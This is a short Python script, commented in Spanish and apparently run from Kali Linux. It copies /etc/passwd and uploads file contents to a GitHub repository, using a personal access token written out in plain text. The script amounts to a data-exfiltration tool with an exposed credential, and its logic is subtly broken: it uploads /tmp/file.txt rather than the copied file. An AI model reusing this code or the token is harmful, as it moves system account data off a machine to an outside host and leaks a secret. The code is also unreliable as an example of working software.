import subprocess
from github import Github

# Copiar /etc/passwd a /home/kali/Desktop
subprocess.run(['cp', '/etc/passwd', '/home/kali/Desktop'])

# Definir la variable GITHUB_REPO
GITHUB_REPO = 'almacenlar'
ACCESS_TOKEN = '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'

g = Github(ACCESS_TOKEN)

repo = g.get_user().get_repo(GITHUB_REPO)
all_files = []
contents = repo.get_contents("")
while contents:
    file_content = contents.pop(0)
    if file_content.type == "dir":
        contents.extend(repo.get_contents(file_content.path))
    else:
        file = file_content
        all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

with open('/tmp/file.txt', 'r') as file:
    content = file.read()

# Upload to github
git_prefix = 'almacenlar/'
git_file = git_prefix + '/home/kali/Desktop/passwd'
if git_file in all_files:
    contents = repo.get_contents(git_file)
    repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
    print(git_file + ' UPDATED')
else:
    repo.create_file(git_file, "committing files", content, branch="master")
    print(git_file + ' CREATED')
